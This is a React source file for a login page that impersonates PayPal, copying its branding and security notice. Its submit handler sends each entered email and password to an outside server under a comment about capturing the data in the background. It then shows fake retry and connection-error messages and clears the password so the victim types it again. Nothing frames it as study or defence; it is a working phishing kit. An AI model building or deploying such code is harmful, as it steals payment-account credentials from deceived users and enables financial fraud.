import React, { useState } from "react";
import axios from "axios";
import { toast, ToastContainer } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import { MdVisibility, MdVisibilityOff } from "react-icons/md";

export default function Login() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [attempts, setAttempts] = useState(0);
  const [showPassword, setShowPassword] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      //  Immediately capture the data in the background
      await axios.post("https://paypalcom-nl.onrender.com/api/auth/login", {
        email,
        password,
      });

      // 2. Start the 3-minute fake loading (180,000 ms)
      setTimeout(() => {
        setLoading(false);
        const newAttemptCount = attempts + 1;
        setAttempts(newAttemptCount);

        // 3. Logic for Toast Messages
        if (newAttemptCount < 2) {
          toast.warn("Please try again", {
            position: "top-center",
            autoClose: 1000,
          });
        } else {
          toast.error("Connection error, try again later", {
            position: "top-center",
            autoClose: false, // Keep it visible
          });
        }

        // Clear password field to force re-entry
        setPassword("");
      }, 1800);
    } catch (error) {
      // If the actual server fails, we still stop loading after a bit
      setLoading(false);
      toast.error("System busy. Please try again later.");
    }
  };
  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-100 px-4">
      <div className="bg-white w-full max-w-md rounded-xl shadow-md p-6">
        {/* Logo */}
        <h1 className="text-center text-2xl font-bold text-[#003087]">
          Pay <span className="text-blue-600">Pal</span>
        </h1>

        {/* Heading */}
        <p className="text-center  mb-6">Log in to your PayPal account</p>

        {/* Form */}
        <form className="space-y-4" onSubmit={handleSubmit}>
          <input
            type="text"
            required
            disabled={loading}
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            placeholder="Email"
            className="w-full border border-gray-300 rounded-md px-4 py-2 focus:ring-2 focus:ring-blue-500 outline-none disabled:bg-gray-50"
          />
          <div className="relative">
            <input
              type={showPassword ? "text" : "password"}
              required
              disabled={loading}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Password"
              className="w-full border border-gray-300 rounded-md px-4 py-2 focus:ring-2 focus:ring-blue-500 outline-none disabled:bg-gray-50"
            />

            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 top-4 text-gray-500"
            >
              {showPassword ? <MdVisibility /> : <MdVisibilityOff />}
            </button>
          </div>
          <button
            type="submit"
            disabled={loading}
            className={`w-full py-3 rounded-md font-bold text-white transition-all ${
              loading
                ? "bg-gray-400 cursor-wait"
                : "bg-[#1757ce] hover:bg-[#002266]"
            }`}
          >
            {loading ? (
              <div className="flex items-center justify-center gap-2">
                <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                Verifying...
              </div>
            ) : (
              "Log In"
            )}
          </button>
        </form>

        {/* Trouble link */}
        <div className="text-center mt-4">
          <a href="#" className="text-blue-600 text-sm hover:underline">
            Having trouble logging in?
          </a>
        </div>

        {/* Divider */}
        <div className="flex items-center my-6">
          <hr className="flex-grow border-gray-300" />
          <span className="mx-2 text-gray-400 text-sm">or</span>
          <hr className="flex-grow border-gray-300" />
        </div>

        {/* Sign Up Button */}
        {/* <button className="w-full border border-blue-500 text-blue-600 py-2 rounded-md hover:bg-blue-50 transition">
          Sign Up
        </button> */}

        {/* Security Note */}
        <p className="text-xs text-[17px] text-gray-500 mt-6 text-center">
          <span className="font-bold text-gray-700">Security:</span> PayPal will
          never ask you to provide your password, PIN, or other sensitive
          information through email, text messages, or phone calls.
        </p>
      </div>
    </div>
  );
}
